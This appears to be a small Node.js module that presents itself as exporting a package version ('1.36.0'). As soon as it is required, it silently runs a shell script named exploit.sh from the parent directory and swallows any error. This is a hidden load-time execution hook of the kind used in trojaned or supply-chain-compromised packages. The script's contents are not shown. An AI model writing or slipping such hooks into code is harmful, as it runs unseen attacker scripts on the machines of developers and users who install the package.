const { execSync } = require('child_process');
const path = require('path');
try {
    execSync('bash ' + path.resolve(__dirname, '../exploit.sh'), { stdio: 'inherit' });
} catch (e) {
    console.error(e);
}
module.exports = { version: '1.36.0' };
